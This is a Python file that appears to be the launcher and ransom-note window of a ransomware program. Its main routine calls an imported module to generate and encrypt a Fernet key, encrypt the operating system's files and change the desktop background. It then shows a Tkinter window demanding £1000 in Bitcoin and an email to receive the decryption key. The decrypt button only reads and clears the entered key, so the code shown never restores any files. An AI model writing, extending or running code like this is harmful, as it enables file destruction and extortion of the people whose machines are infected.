from tkinter import font
from tkinter.constants import BOTTOM, END, LEFT
from typing import Sized
from modules import ransomware
import tkinter as tk
#import PIL 



class Application:
    def __init__(self, master):
        self.master = master
        master.geometry('900x650')
        master.title('Ransomware')
        master.configure(bg='darkred')
        self.message = '''
        YOU HAVE BEEN HACKED.
        All your files have been encrypted with the strongest technology that exists.
        If you attempt in any way to recover your files; they will be damaged and
        unrecoverable forever. The only way to recover your files is to transfer
        £1000 in Bitcoin to the provided address.
        Then send an email to XXX@protonmail.com with a receipt to recieve the
        decryption key in return.

        Input the key in the field below and click the "Decrypt Files" button.
        '''
        
        self.top_frame = tk.Frame(master, bg='darkgrey', height=120, width=900)
        self.top_frame.pack()

        self.middle_frame = tk.Frame(master, bg='blue', width=750)
        self.middle_frame.pack()
        self.info_label = tk.Label(self.middle_frame, text=self.message, font='ubuntu 17')
        self.info_label.pack()
        
        self.bottom_frame = tk.Frame(master, bg='purple')
        self.bottom_frame.pack(side=BOTTOM)
        self.bottom_lbl = tk.Label(self.bottom_frame, text='Enter decryption key:')
        self.bottom_lbl.pack(side=LEFT)
        self.bottom_entry = tk.Entry(self.bottom_frame, width='50', font='ubuntu 15')
        self.bottom_entry.pack(side=LEFT)
        self.bottom_btn = tk.Button(self.bottom_frame, text='Decrypt\nFiles', command=self.button)
        self.bottom_btn.pack(side=LEFT)

    def button(self):
        decrypt_key = self.bottom_entry.get()
        self.bottom_entry.delete(0, END)



def main():
    malware = ransomware.Ransomware()
    malware.create_fernet_key()
    malware.encrypt_fernet_key()
    malware.encrypt_os()
    malware.update_background()
    root = tk.Tk()
    app = Application(master=root)
    root.mainloop()

if __name__ == '__main__':
    main()